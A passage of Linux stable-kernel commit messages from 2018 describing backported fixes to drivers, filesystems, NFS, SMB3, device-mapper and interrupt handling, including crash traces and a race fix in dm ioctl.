is mostly a cleanup, better to revert it.
This reverts commit 7d95fb746c4eece67308f1642a666ea1ebdbd2cc.
Cc: stable@vger.kernel.org # For Kernel 4.18
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit d661c89b177d8b0b8e2be703b918146e9fc9d132
Author: Hans Verkuil
Date: Mon Oct 8 15:08:27 2018 -0400
media: v4l2-tpg: fix kernel oops when enabling HFLIP and OSD
commit 250854eed5d45a73d81e4137dfd85180af6f2ec3 upstream.
When the OSD is on (i.e. vivid displays text on top of the test pattern), and
you enable hflip, then the driver crashes.
The cause turned out to be a division of a negative number by an unsigned value.
You expect that -8 / 2U would be -4, but in reality it is 2147483644 :-(
Fixes: 3e14e7a82c1ef ("vivid-tpg: add hor/vert downsampling support to tpg\_gen\_text")
Signed-off-by: Hans Verkuil
Reported-by: Mauro Carvalho Chehab
Cc:  # for v4.1 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit ebc14b2ad1e763a5a71bd0901f5d816bbe0ab48b
Author: Johan Hovold
Date: Mon Aug 27 10:21:50 2018 +0200
net: bcmgenet: fix OF child-node lookup
commit d397dbe606120a1ea1b11b0020c3f7a3852da5ac upstream.
Use the new of\_get\_compatible\_child() helper to lookup the mdio child
node instead of using of\_find\_compatible\_node(), which searches the
entire tree from a given start node and thus can return an unrelated
(i.e. non-child) node.
This also addresses a potential use-after-free (e.g. after probe
deferral) as the tree-wide helper drops a reference to its first
argument (i.e. the node of the device being probed).
Fixes: aa09677cba42 ("net: bcmgenet: add MDIO routines")
Cc: stable  # 3.15
Cc: David S. Miller
Reviewed-by: Florian Fainelli
Signed-off-by: Johan Hovold
Signed-off-by: Rob Herring
Signed-off-by: Greg Kroah-Hartman
commit 0f664bdc5f98bdfabfadea4b3c35f2cd84770d56
Author: Maciej W. Rozycki
Date: Wed Oct 3 13:21:07 2018 +0100
TC: Set DMA masks for devices
commit 3f2aa244ee1a0d17ed5b6c86564d2c1b24d1c96b upstream.
Fix a TURBOchannel support regression with commit 205e1b7f51e4
("dma-mapping: warn when there is no coherent\_dma\_mask") that caused
coherent DMA allocations to produce a warning such as:
defxx: v1.11 2014/07/01 Lawrence V. Stefani and others
tc1: DEFTA at MMIO addr = 0x1e900000, IRQ = 20, Hardware addr = 08-00-2b-a3-a3-29
------------[ cut here ]------------
WARNING: CPU: 0 PID: 1 at ./include/linux/dma-mapping.h:516 dfx\_dev\_register+0x670/0x678
Modules linked in:
CPU: 0 PID: 1 Comm: swapper Not tainted 4.19.0-rc6 #2
Stack : ffffffff8009ffc0 fffffffffffffec0 0000000000000000 ffffffff80647650
0000000000000000 0000000000000000 ffffffff806f5f80 ffffffffffffffff
0000000000000000 0000000000000000 0000000000000001 ffffffff8065d4e8
98000000031b6300 ffffffff80563478 ffffffff805685b0 ffffffffffffffff
0000000000000000 ffffffff805d6720 0000000000000204 ffffffff80388df8
0000000000000000 0000000000000009 ffffffff8053efd0 ffffffff806657d0
0000000000000000 ffffffff803177f8 0000000000000000 ffffffff806d0000
9800000003078000 980000000307b9e0 000000001e900000 ffffffff80067940
0000000000000000 ffffffff805d6720 0000000000000204 ffffffff80388df8
ffffffff805176c0 ffffffff8004dc78 0000000000000000 ffffffff80067940
...
Call Trace:
[] show\_stack+0xa0/0x130
[] \_\_warn+0x128/0x170
---[ end trace b1d1e094f67f3bb2 ]---
This is because the TURBOchannel bus driver fails to set the coherent
DMA mask for devices enumerated.
Set the regular and coherent DMA masks for TURBOchannel devices then,
observing that the bus protocol supports a 34-bit (16GiB) DMA address
space, by interpreting the value presented in the address cycle across
the 32 `ad' lines as a 32-bit word rather than byte address[1]. The
architectural size of the TURBOchannel DMA address space exceeds the
maximum amount of RAM any actual TURBOchannel system in existence may
have, hence both masks are the same.
This removes the warning shown above.
References:
[1] "TURBOchannel Hardware Specification", EK-369AA-OD-007B, Digital
Equipment Corporation, January 1993, Section "DMA", pp. 1-15 -- 1-17
Signed-off-by: Maciej W. Rozycki
Signed-off-by: Paul Burton
Patchwork: https://patchwork.linux-mips.org/patch/20835/
Fixes: 205e1b7f51e4 ("dma-mapping: warn when there is no coherent\_dma\_mask")
Cc: stable@vger.kernel.org # 4.16+
Cc: Ralf Baechle
Signed-off-by: Greg Kroah-Hartman
commit eddf6140dbeadd3cb336214f24ee2edb1bb263fd
Author: Will Deacon
Date: Mon Oct 1 12:42:49 2018 +0100
iommu/arm-smmu: Ensure that page-table updates are visible before TLBI
commit 7d321bd3542500caf125249f44dc37cb4e738013 upstream.
The IO-pgtable code relies on the driver TLB invalidation callbacks to
ensure that all page-table updates are visible to the IOMMU page-table
walker.
In the case that the page-table walker is cache-coherent, we cannot rely
on an implicit DSB from the DMA-mapping code, so we must ensure that we
execute a DSB in our tlb\_add\_flush() callback prior to triggering the
invalidation.
Cc:
Cc: Robin Murphy
Fixes: 2df7a25ce4a7 ("iommu/arm-smmu: Clean up DMA API usage")
Signed-off-by: Will Deacon
Signed-off-by: Greg Kroah-Hartman
commit 220720a431bfe42cb00d9d0b7583657df7c82e4b
Author: Christophe Lombard
Date: Tue Aug 14 14:45:15 2018 +0200
ocxl: Fix access to the AFU Descriptor Data
commit 6f8e45f7eb1bee5efdbe4a9cfe4a45627403c5fb upstream.
The AFU Information DVSEC capability is a means to extract common,
general information about all of the AFUs associated with a Function
independent of the specific functionality that each AFU provides.
Write in the AFU Index field allows to access to the descriptor data
for each AFU.
With the current code, we are not able to access to these specific data
when the index >= 1 because we are writing to the wrong location.
All requests to the data of each AFU are pointing to those of the AFU 0,
which could have impacts when using a card with more than one AFU per
function.
This patch fixes the access to the AFU Descriptor Data indexed by the
AFU Info Index field.
Fixes: 5ef3166e8a32 ("ocxl: Driver code for 'generic' opencapi devices")
Cc: stable  # 4.16
Signed-off-by: Christophe Lombard
Signed-off-by: Greg Kroah-Hartman
Acked-by: Frederic Barrat
Acked-by: Andrew Donnellan
Signed-off-by: Michael Ellerman
commit 02eabf6ac681b57e21d7332c0290ec2be4801094
Author: Johan Hovold
Date: Mon Aug 27 10:21:53 2018 +0200
power: supply: twl4030-charger: fix OF sibling-node lookup
commit 9844fb2e351311210e6660a9a1c62d17424a6145 upstream.
Use the new of\_get\_compatible\_child() helper to lookup the usb sibling
node instead of using of\_find\_compatible\_node(), which searches the
entire tree from a given start node and thus can return an unrelated
(non-sibling) node.
This also addresses a potential use-after-free (e.g. after probe
deferral) as the tree-wide helper drops a reference to its first
argument (i.e. the parent device node).
While at it, also fix the related phy-node reference leak.
Fixes: f5e4edb8c888 ("power: twl4030\_charger: find associated phy by more reliable means.")
Cc: stable  # 4.2
Cc: NeilBrown
Cc: Felipe Balbi
Cc: Sebastian Reichel
Reviewed-by: Sebastian Reichel
Signed-off-by: Johan Hovold
Signed-off-by: Rob Herring
Signed-off-by: Greg Kroah-Hartman
commit 8631b7bd98b94efba28e918eac0311a6db03c3f4
Author: Maciej W. Rozycki
Date: Tue Oct 2 02:09:05 2018 +0100
rtc: cmos: Remove the `use\_acpi\_alarm' module parameter for !ACPI
commit bc51098cdd9573bfdecfd02fc8ed474419d73ea0 upstream.
Fix a problem with commit 311ee9c151ad ("rtc: cmos: allow using ACPI for
RTC alarm instead of HPET") defining `use\_acpi\_alarm' module parameter
even for non-ACPI platforms, which ignore it. Wrap the definition into
#ifdef CONFIG\_ACPI and use a static inline wrapper function, hardcoded
to return 0 and consequently optimized away for !ACPI, following the
existing pattern with HPET handling functions.
Signed-off-by: Maciej W. Rozycki
Fixes: 311ee9c151ad ("rtc: cmos: allow using ACPI for RTC alarm instead of HPET")
Cc: stable@vger.kernel.org # 4.18+
Signed-off-by: Alexandre Belloni
Signed-off-by: Greg Kroah-Hartman
commit 5b6bdf14357c1c535f6f534889c377c501f110fc
Author: Maciej W. Rozycki
Date: Tue Oct 2 02:08:49 2018 +0100
rtc: cmos: Fix non-ACPI undefined reference to `hpet\_rtc\_interrupt'
commit d197a253855d2d8e507a003880aab35c4e2473db upstream.
Fix a commit 311ee9c151ad ("rtc: cmos: allow using ACPI for RTC alarm
instead of HPET") `rtc-cmos' regression causing a link error:
drivers/rtc/rtc-cmos.o: In function `cmos\_platform\_probe':
rtc-cmos.c:(.init.text+0x33c): undefined reference to `hpet\_rtc\_interrupt'
rtc-cmos.c:(.init.text+0x3f4): undefined reference to `hpet\_rtc\_interrupt'
with non-ACPI platforms using this driver. The cause is the change of
the condition guarding the use of `hpet\_rtc\_interrupt'.
Previously it was a call to `is\_hpet\_enabled'. That function is static
inline and has a hardcoded 0 result for non-ACPI platforms, which imply
!HPET\_EMULATE\_RTC. Consequently the compiler optimized the whole block
away including the reference to `hpet\_rtc\_interrupt', which never made
it to the link stage.
Now the guarding condition is a call to `use\_hpet\_alarm', which is not
static inline and therefore the compiler may not be able to prove that
it actually always returns 0 for non-ACPI platforms. Consequently the
build breaks with an unsatisfied reference, because `hpet\_rtc\_interrupt'
is nowhere defined at link time.
Fix the problem by marking `use\_hpet\_alarm' inline. As the `inline'
keyword serves as an optimization hint rather than a requirement the
compiler is still free to choose whether inlining will be beneficial or
not for ACPI platforms.
Signed-off-by: Maciej W. Rozycki
Fixes: 311ee9c151ad ("rtc: cmos: allow using ACPI for RTC alarm instead of HPET")
Cc: stable@vger.kernel.org # 4.18+
Signed-off-by: Alexandre Belloni
Signed-off-by: Greg Kroah-Hartman
commit e0e51867714987b85fbd3dcc9811f319e109d899
Author: Soeren Moch
Date: Mon Oct 22 14:38:12 2018 +0200
rtc: ds1307: fix ds1339 wakealarm support
commit 7dceef78f310f5351735060d78a1777c69606016 upstream.
Commit 51ed73eb998a1c79a2b0e9bed68f75a8a2c93b9b ("rtc: ds1340: Add support
for trickle charger.") breaks ds1339 wakealarm support by limiting
accessible registers. Fix this.
Fixes: 51ed73eb998a ("rtc: ds1340: Add support for trickle charger.")
Cc: stable@vger.kernel.org
Signed-off-by: Soeren Moch
Signed-off-by: Alexandre Belloni
Signed-off-by: Greg Kroah-Hartman
commit 1145e2b587d7af3b0fa631d803380205377698ed
Author: Aaro Koskinen
Date: Sat Oct 27 01:46:34 2018 +0300
MIPS: OCTEON: fix out of bounds array access on CN68XX
commit c0fae7e2452b90c31edd2d25eb3baf0c76b400ca upstream.
The maximum number of interfaces is returned by
cvmx\_helper\_get\_number\_of\_interfaces(), and the value is used to access
interface\_port\_count[]. When CN68XX support was added, we forgot
to increase the array size. Fix that.
Fixes: 2c8c3f0201333 ("MIPS: Octeon: Support additional interfaces on CN68XX")
Signed-off-by: Aaro Koskinen
Signed-off-by: Paul Burton
Patchwork: https://patchwork.linux-mips.org/patch/20949/
Cc: Ralf Baechle
Cc: linux-mips@linux-mips.org
Cc: linux-kernel@vger.kernel.org
Cc: stable@vger.kernel.org # v4.3+
Signed-off-by: Greg Kroah-Hartman
commit 5cd5e22d5b1d9093140e5c3ec2cb27332aade1ae
Author: Maciej W. Rozycki
Date: Tue Oct 2 12:50:11 2018 +0100
MIPS: memset: Fix CPU\_DADDI\_WORKAROUNDS `small\_fixup' regression
commit 2f7619ae90bf78cf576b5e72087aab0435266fdb upstream.
Fix a commit 8a8158c85e1e ("MIPS: memset.S: EVA & fault support for
small\_memset") regression and remove assembly warnings:
arch/mips/lib/memset.S: Assembler messages:
arch/mips/lib/memset.S:243: Warning: Macro instruction expanded into multiple instructions in a branch delay slot
triggering with the CPU\_DADDI\_WORKAROUNDS option set and this code:
PTR\_SUBU a2, t1, a0
jr ra
PTR\_ADDIU a2, 1
This is because with that option in place the DADDIU instruction, which
the PTR\_ADDIU CPP macro expands to, becomes a GAS macro, which in turn
expands to an LI/DADDU (or actually ADDIU/DADDU) sequence:
13c: 01a4302f dsubu a2,t1,a0
140: 03e00008 jr ra
144: 24010001 li at,1
148: 00c1302d daddu a2,a2,at
...
Correct this by switching off the `noreorder' assembly mode and letting
GAS schedule this jump's delay slot, as there is nothing special about
it that would require manual scheduling. With this change in place
correct code is produced:
13c: 01a4302f dsubu a2,t1,a0
140: 24010001 li at,1
144: 03e00008 jr ra
148: 00c1302d daddu a2,a2,at
...
Signed-off-by: Maciej W. Rozycki
Signed-off-by: Paul Burton
Fixes: 8a8158c85e1e ("MIPS: memset.S: EVA & fault support for small\_memset")
Patchwork: https://patchwork.linux-mips.org/patch/20833/
Cc: Ralf Baechle
Cc: stable@vger.kernel.org # 4.17+
Signed-off-by: Greg Kroah-Hartman
commit 163121109386e3876a472aeff31ab0428ee22d3e
Author: Nicholas Piggin
Date: Mon Aug 27 13:03:01 2018 +1000
powerpc/64s/hash: Do not use PPC\_INVALIDATE\_ERAT on CPUs before POWER9
commit bc276ecba132caccb1fda5863a652c15def2b8c6 upstream.
PPC\_INVALIDATE\_ERAT is slbia IH=7 which is a new variant introduced
with POWER9, and the result is undefined on earlier CPUs.
Commits 7b9f71f974 ("powerpc/64s: POWER9 machine check handler") and
d4748276ae ("powerpc/64s: Improve local TLB flush for boot and MCE on
POWER9") caused POWER7/8 code to use this instruction. Remove it. An
ERAT flush can be made by invalidatig the SLB, but before POWER9 that
requires a flush and rebolt.
Fixes: 7b9f71f974 ("powerpc/64s: POWER9 machine check handler")
Fixes: d4748276ae ("powerpc/64s: Improve local TLB flush for boot and MCE on POWER9")
Cc: stable@vger.kernel.org # v4.11+
Signed-off-by: Nicholas Piggin
Signed-off-by: Michael Ellerman
Signed-off-by: Greg Kroah-Hartman
commit ba5a3866a609f3a8f1aec572d5b565ff7fbb4554
Author: Michael Neuling
Date: Tue Sep 11 13:07:56 2018 +1000
powerpc/tm: Fix HFSCR bit for no suspend case
commit dd9a8c5a87395b6f05552c3b44e42fdc95760552 upstream.
Currently on P9N DD2.1 we end up taking infinite TM facility
unavailable exceptions on the first TM usage by userspace.
In the special case of TM no suspend (P9N DD2.1), Linux is told TM is
off via CPU dt-ftrs but told to (partially) use it via
OPAL\_REINIT\_CPUS\_TM\_SUSPEND\_DISABLED. So HFSCR[TM] will be off from
dt-ftrs but we need to turn it on for the no suspend case.
This patch fixes this by enabling HFSCR TM in this case.
Cc: stable@vger.kernel.org # 4.15+
Signed-off-by: Michael Neuling
Signed-off-by: Paul Mackerras
Signed-off-by: Greg Kroah-Hartman
commit c0668860758ead905b998dc78e9e61a814ff43fa
Author: Christophe Leroy
Date: Fri Oct 19 06:12:50 2018 +0000
powerpc/msi: Fix compile error on mpc83xx
commit 0f99153def98134403c9149128e59d3e1786cf04 upstream.
mpic\_get\_primary\_version() is not defined when not using MPIC.
The compile error log like:
arch/powerpc/sysdev/built-in.o: In function `fsl\_of\_msi\_probe':
fsl\_msi.c:(.text+0x150c): undefined reference to `fsl\_mpic\_primary\_get\_version'
Signed-off-by: Jia Hongtao
Signed-off-by: Scott Wood
Reported-by: Radu Rendec
Fixes: 807d38b73b6 ("powerpc/mpic: Add get\_version API both for internal and external use")
Cc: stable@vger.kernel.org
Signed-off-by: Christophe Leroy
Signed-off-by: Michael Ellerman
Signed-off-by: Greg Kroah-Hartman
commit a0bac51733c0501900adfcdf85ec3547138b23d6
Author: Jan Kara
Date: Wed Oct 17 13:07:05 2018 +0200
fsnotify: Fix busy inodes during unmount
commit 721fb6fbfd2132164c2e8777cc837f9b2c1794dc upstream.
Detaching of mark connector from fsnotify\_put\_mark() can race with
unmounting of the filesystem like:
CPU1 CPU2
fsnotify\_put\_mark()
spin\_lock(&conn->lock);
...
inode = fsnotify\_detach\_connector\_from\_object(conn)
spin\_unlock(&conn->lock);
generic\_shutdown\_super()
fsnotify\_unmount\_inodes()
sees connector detached for inode
-> nothing to do
evict\_inode()
barfs on pending inode reference
iput(inode);
Resulting in "Busy inodes after unmount" message and possible kernel
oops. Make fsnotify\_unmount\_inodes() properly wait for outstanding inode
references from detached connectors.
Note that the accounting of outstanding inode references in the
superblock can cause some cacheline contention on the counter. OTOH it
happens only during deletion of the last notification mark from an inode
(or during unlinking of watched inode) and that is not too bad. I have
measured time to create & delete inotify watch 100000 times from 64
processes in parallel (each process having its own inotify group and its
own file on a shared superblock) on a 64 CPU machine. Average and
standard deviation of 15 runs look like:
Avg Stddev
Vanilla 9.817400 0.276165
Fixed 9.710467 0.228294
So there's no statistically significant difference.
Fixes: 6b3f05d24d35 ("fsnotify: Detach mark from object list when last reference is dropped")
CC: stable@vger.kernel.org
Signed-off-by: Jan Kara
Signed-off-by: Greg Kroah-Hartman
commit ddb75410b6a6f4176a2813002fc4f045a1e77147
Author: Lubomir Rintel
Date: Thu Oct 4 17:29:03 2018 -0400
media: ov7670: make "xclk" clock optional
commit 786fa584eda86d6598db3b87c61dc81f68808d11 upstream.
When the "xclk" clock was added, it was made mandatory. This broke the
driver on an OLPC plaform which doesn't know such clock. Make it
optional.
Tested on a OLPC XO-1 laptop.
Fixes: 0a024d634cee ("[media] ov7670: get xclk")
Cc: stable@vger.kernel.org # 4.11+
Signed-off-by: Lubomir Rintel
Signed-off-by: Sakari Ailus
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 933833d56e3c8d6a08e4bc13a00742c7ef7b2b9d
Author: Damien Le Moal
Date: Wed Oct 17 18:05:08 2018 +0900
dm zoned: fix various dmz\_get\_mblock() issues
commit 3d4e738311327bc4ba1d55fbe2f1da3de4a475f9 upstream.
dmz\_fetch\_mblock() called from dmz\_get\_mblock() has a race since the
allocation of the new metadata block descriptor and its insertion in
the cache rbtree with the READING state is not atomic. Two different
contexts requesting the same block may end up each adding two different
descriptors of the same block to the cache.
Another problem for this function is that the BIO for processing the
block read is allocated after the metadata block descriptor is inserted
in the cache rbtree. If the BIO allocation fails, the metadata block
descriptor is freed without first being removed from the rbtree.
Fix the first problem by checking again if the requested block is not in
the cache right before inserting the newly allocated descriptor,
atomically under the mblk\_lock spinlock. The second problem is fixed by
simply allocating the BIO before inserting the new block in the cache.
Finally, since dmz\_fetch\_mblock() also increments a block reference
counter, rename the function to dmz\_get\_mblock\_slow(). To be symmetric
and clear, also rename dmz\_lookup\_mblock() to dmz\_get\_mblock\_fast() and
increment the block reference counter directly in that function rather
than in dmz\_get\_mblock().
Fixes: 3b1a94c88b79 ("dm zoned: drive-managed zoned block device target")
Cc: stable@vger.kernel.org
Signed-off-by: Damien Le Moal
Signed-off-by: Mike Snitzer
Signed-off-by: Greg Kroah-Hartman
commit 8acae84c058c890b00bcbb0e4ab4a5634652c071
Author: Damien Le Moal
Date: Wed Oct 17 18:05:07 2018 +0900
dm zoned: fix metadata block ref counting
commit 33c2865f8d011a2ca9f67124ddab9dc89382e9f1 upstream.
Since the ref field of struct dmz\_mblock is always used with the
spinlock of struct dmz\_metadata locked, there is no need to use an
atomic\_t type. Change the type of the ref field to an unsigne
integer.
Fixes: 3b1a94c88b79 ("dm zoned: drive-managed zoned block device target")
Cc: stable@vger.kernel.org
Signed-off-by: Damien Le Moal
Signed-off-by: Mike Snitzer
Signed-off-by: Greg Kroah-Hartman
commit 58963dc60bb5bf0f44c70ea829b378a3f537cd9d
Author: Wenwen Wang
Date: Wed Oct 3 11:43:59 2018 -0500
dm ioctl: harden copy\_params()'s copy\_from\_user() from malicious users
commit 800a7340ab7dd667edf95e74d8e4f23a17e87076 upstream.
In copy\_params(), the struct 'dm\_ioctl' is first copied from the user
space buffer 'user' to 'param\_kernel' and the field 'data\_size' is
checked against 'minimum\_data\_size' (size of 'struct dm\_ioctl' payload
up to its 'data' member). If the check fails, an error code EINVAL will be
returned. Otherwise, param\_kernel->data\_size is used to do a second copy,
which copies from the same user-space buffer to 'dmi'. After the second
copy, only 'dmi->data\_size' is checked against 'param\_kernel->data\_size'.
Given that the buffer 'user' resides in the user space, a malicious
user-space process can race to change the content in the buffer between
the two copies. This way, the attacker can inject inconsistent data
into 'dmi' (versus previously validated 'param\_kernel').
Fix redundant copying of 'minimum\_data\_size' from user-space buffer by
using the first copy stored in 'param\_kernel'. Also remove the
'data\_size' check after the second copy because it is now unnecessary.
Cc: stable@vger.kernel.org
Signed-off-by: Wenwen Wang
Signed-off-by: Mike Snitzer
Signed-off-by: Greg Kroah-Hartman
commit 1bc549827094742c77cfeb639ef77b8199169a46
Author: Amir Goldstein
Date: Fri Sep 28 20:41:48 2018 +0300
lockd: fix access beyond unterminated strings in prints
commit 93f38b6fae0ea8987e22d9e6c38f8dfdccd867ee upstream.
printk format used %\*s instead of %.\*s, so hostname\_len does not limit
the number of bytes accessed from hostname.
Signed-off-by: Amir Goldstein
Cc: stable@vger.kernel.org
Signed-off-by: J. Bruce Fields
Signed-off-by: Greg Kroah-Hartman
commit 7b4718d2d53d5ae878db577a1fb62b97f28827b4
Author: Trond Myklebust
Date: Tue Oct 9 15:54:15 2018 -0400
nfsd: Fix an Oops in free\_session()
commit bb6ad5572c0022e17e846b382d7413cdcf8055be upstream.
In call\_xpt\_users(), we delete the entry from the list, but we
do not reinitialise it. This triggers the list poisoning when
we later call unregister\_xpt\_user() in nfsd4\_del\_conns().
Signed-off-by: Trond Myklebust
Cc: stable@vger.kernel.org
Signed-off-by: J. Bruce Fields
Signed-off-by: Greg Kroah-Hartman
commit 04868067e324128fd4b3bee2bfaf504aee9bd3d9
Author: Andrew Elble
Date: Fri Oct 5 09:32:08 2018 -0400
nfsd: correctly decrement odstate refcount in error path
commit bd8d725078867cda250fe94b9c5a067b4a64ca74 upstream.
alloc\_init\_deleg() both allocates an nfs4\_delegation, and
bumps the refcount on odstate. So after this point, we need to
put\_clnt\_odstate() and nfs4\_put\_stid() to not leave the odstate
refcount inappropriately bumped.
Signed-off-by: Andrew Elble
Reviewed-by: Jeff Layton
Cc: stable@vger.kernel.org
Signed-off-by: J. Bruce Fields
Signed-off-by: Greg Kroah-Hartman
commit 209502944483dedde1bbc0c8a1afc7ae839a9bcf
Author: Benjamin Coddington
Date: Thu Oct 18 15:01:48 2018 -0400
nfs: Fix a missed page unlock after pg\_doio()
commit fdbd1a2e4a71adcb1ae219fcfd964930d77a7f84 upstream.
We must check pg\_error and call error\_cleanup after any call to pg\_doio.
Currently, we are skipping the unlock of a page if we encounter an error in
nfs\_pageio\_complete() before handing off the work to the RPC layer.
Signed-off-by: Benjamin Coddington
Cc: stable@vger.kernel.org
Signed-off-by: Trond Myklebust
Signed-off-by: Greg Kroah-Hartman
commit 006a1e6a2d9e5c2412f09f480d8ade49f29f415c
Author: Trond Myklebust
Date: Tue Sep 18 10:07:44 2018 -0400
NFSv4.1: Fix the r/wsize checking
commit 943cff67b842839f4f35364ba2db5c2d3f025d94 upstream.
The intention of nfs4\_session\_set\_rwsize() was to cap the r/wsize to the
buffer sizes negotiated by the CREATE\_SESSION. The initial code had a
bug whereby we would not check the values negotiated by nfs\_probe\_fsinfo()
(the assumption being that CREATE\_SESSION will always negotiate buffer values
that are sane w.r.t. the server's preferred r/wsizes) but would only check
values set by the user in the 'mount' command.
The code was changed in 4.11 to \_always\_ set the r/wsize, meaning that we
now never use the server preferred r/wsizes. This is the regression that
this patch fixes.
Also rename the function to nfs4\_session\_limit\_rwsize() in order to avoid
future confusion.
Fixes: 033853325fe3 (NFSv4.1 respect server's max size in CREATE\_SESSION")
Cc: stable@vger.kernel.org # v4.11+
Signed-off-by: Trond Myklebust
Signed-off-by: Greg Kroah-Hartman
commit 8fb746ed8e0c5153d2860ba9558e95e0999829d3
Author: Johan Hovold
Date: Mon Aug 27 10:21:52 2018 +0200
NFC: nfcmrvl\_uart: fix OF child-node lookup
commit 5bf59773aaf36dd62117dc83d50e1bbf9ef432da upstream.
Use the new of\_get\_compatible\_child() helper to lookup the nfc child
node instead of using of\_find\_compatible\_node(), which searches the
entire tree from a given start node and thus can return an unrelated
(i.e. non-child) node.
This also addresses a potential use-after-free (e.g. after probe
deferral) as the tree-wide helper drops a reference to its first
argument (i.e. the parent node).
Fixes: e097dc624f78 ("NFC: nfcmrvl: add UART driver")
Fixes: d8e018c0b321 ("NFC: nfcmrvl: update device tree bindings for Marvell NFC")
Cc: stable  # 4.2
Cc: Vincent Cuissard
Cc: Samuel Ortiz
Signed-off-by: Johan Hovold
Signed-off-by: Rob Herring
Signed-off-by: Greg Kroah-Hartman
commit 193e214685dd022342fcb8ceaef4c81cc3dff4d1
Author: Lukas Wunner
Date: Thu Oct 18 15:15:05 2018 +0200
genirq: Fix race on spurious interrupt detection
commit 746a923b863a1065ef77324e1e43f19b1a3eab5c upstream.
Commit 1e77d0a1ed74 ("genirq: Sanitize spurious interrupt detection of
threaded irqs") made detection of spurious interrupts work for threaded
handlers by:
a) incrementing a counter every time the thread returns IRQ\_HANDLED, and
b) checking whether that counter has increased every time the thread is
woken.
However for oneshot interrupts, the commit unmasks the interrupt before
incrementing the counter. If another interrupt occurs right after
unmasking but before the counter is incremented, that interrupt is
incorrectly considered spurious:
time
| irq\_thread()
| irq\_thread\_fn()
| action->thread\_fn()
| irq\_finalize\_oneshot()
| unmask\_threaded\_irq() /\* interrupt is unmasked \*/
|
| /\* interrupt fires, incorrectly deemed spurious \*/
|
| atomic\_inc(&desc->threads\_handled); /\* counter is incremented \*/
v
This is observed with a hi3110 CAN controller receiving data at high volume
(from a separate machine sending with "cangen -g 0 -i -x"): The controller
signals a huge number of interrupts (hundreds of millions per day) and
every second there are about a dozen which are deemed spurious.
In theory with high CPU load and the presence of higher priority tasks, the
number of incorrectly detected spurious interrupts might increase beyond
the 99,900 threshold and cause disablement of the interrupt.
In practice it just increments the spurious interrupt count. But that can
cause people to waste time investigating it over and over.
Fix it by moving the accounting before the invocation of
irq\_finalize\_oneshot().
[ tglx: Folded change log update ]
Fixes: 1e77d0a1ed74 ("genirq: Sanitize spurious interrupt detection of threaded irqs")
Signed-off-by: Lukas Wunner
Signed-off-by: Thomas Gleixner
Cc: Mathias Duckeck
Cc: Akshay Bhat
Cc: Casey Fitzpatrick
Cc: stable@vger.kernel.org # v3.16+
Link: https://lkml.kernel.org/r/1dfd8bbd16163940648045495e3e9698e63b50ad.1539867047.git.lukas@wunner.de
Signed-off-by: Greg Kroah-Hartman
commit 06cbcf582cafb2883fd7c9c80c4c3b132e4c1869
Author: He Zhe
Date: Sun Sep 30 00:45:50 2018 +0800
printk: Fix panic caused by passing log\_buf\_len to command line
commit 277fcdb2cfee38ccdbe07e705dbd4896ba0c9930 upstream.
log\_buf\_len\_setup does not check input argument before passing it to
simple\_strtoull. The argument would be a NULL pointer if "log\_buf\_len",
without its value, is set in command line and thus causes the following
panic.
PANIC: early exception 0xe3 IP 10:ffffffffaaeacd0d error 0 cr2 0x0
[ 0.000000] CPU: 0 PID: 0 Comm: swapper Not tainted 4.19.0-rc4-yocto-standard+ #1
[ 0.000000] RIP: 0010:\_parse\_integer\_fixup\_radix+0xd/0x70
...
[ 0.000000] Call Trace:
[ 0.000000] simple\_strtoull+0x29/0x70
[ 0.000000] memparse+0x26/0x90
[ 0.000000] log\_buf\_len\_setup+0x17/0x22
[ 0.000000] do\_early\_param+0x57/0x8e
[ 0.000000] parse\_args+0x208/0x320
[ 0.000000] ? rdinit\_setup+0x30/0x30
[ 0.000000] parse\_early\_options+0x29/0x2d
[ 0.000000] ? rdinit\_setup+0x30/0x30
[ 0.000000] parse\_early\_param+0x36/0x4d
[ 0.000000] setup\_arch+0x336/0x99e
[ 0.000000] start\_kernel+0x6f/0x4ee
[ 0.000000] x86\_64\_start\_reservations+0x24/0x26
[ 0.000000] x86\_64\_start\_kernel+0x6f/0x72
[ 0.000000] secondary\_startup\_64+0xa4/0xb0
This patch adds a check to prevent the panic.
Link: http://lkml.kernel.org/r/1538239553-81805-1-git-send-email-zhe.he@windriver.com
Cc: stable@vger.kernel.org
Cc: rostedt@goodmis.org
Cc: linux-kernel@vger.kernel.org
Signed-off-by: He Zhe
Reviewed-by: Sergey Senozhatsky
Signed-off-by: Petr Mladek
Signed-off-by: Greg Kroah-Hartman
commit fa4aec4d1e6542bfdaa51f332e03c00e1ef230e2
Author: Steve French
Date: Sun Oct 28 13:13:23 2018 -0500
smb3: on kerberos mount if server doesn't specify auth type use krb5
commit 926674de6705f0f1dbf29a62fd758d0977f535d6 upstream.
Some servers (e.g. Azure) do not include a spnego blob in the SMB3
negotiate protocol response, so on kerberos mounts ("sec=krb5")
we can fail, as we expected the server to list its supported
auth types (OIDs in the spnego blob in the negprot response).
Change this so that on krb5 mounts we default to trying krb5 if the
server doesn't list its supported protocol mechanisms.
Signed-off-by: Steve French
Reviewed-by: Ronnie Sahlberg
CC: Stable
Signed-off-by: Greg Kroah-Hartman
commit e8c4202e4b1680570a0736e289964a7dcfd45a41
Author: Steve French
Date: Fri Oct 19 00:45:21 2018 -0500
smb3: do not attempt cifs operation in smb3 query info error path
commit 1e77a8c204c9d1b655c61751b8ad0fde22421dbb upstream.
If backupuid mount option is sent, we can incorrectly retry
(on access denied on query info) with a cifs (FindFirst) operation
on an smb3 mount which causes the server to force the session close.
We set backup intent on open so no need for this fallback.
See kernel bugzilla 201435
Signed-off-by: Steve French
CC: Stable
Reviewed-by: Ronnie Sahlberg
Signed-off-by: Greg Kroah-Hartman
commit 278223e1fa26e3580ab9bf2ffcdfb96fd57e24dd
Author: Steve French
Date: Sat Sep 15 23:04:41 2018 -0500
smb3: allow stats which track session and share reconnects to be reset
commit 2c887635cd6ab3af619dc2be94e5bf8f2e172b78 upstream.
Currently, "echo 0 > /proc/fs/cifs/Stats" resets all of the stats
except the session and share reconnect counts. Fix it to
reset those as well.
CC: Stable
Signed-off-by: Steve French
Reviewed-by: Aurelien Aptel
Signed-off-by: Greg Kroah-Hartman
commit 418f8bfb26e9aedce566d195e9c219247b00779a
Author: Andreas Kemnade
Date: Sat Sep 22 21:20:54 2018 +0200
w1: omap-hdq: fix missing bus unregister at removal
commit a007734618fee1bf35556c04fa498d41d42c7301 upstream.
The bus master was not removed after unloading the module
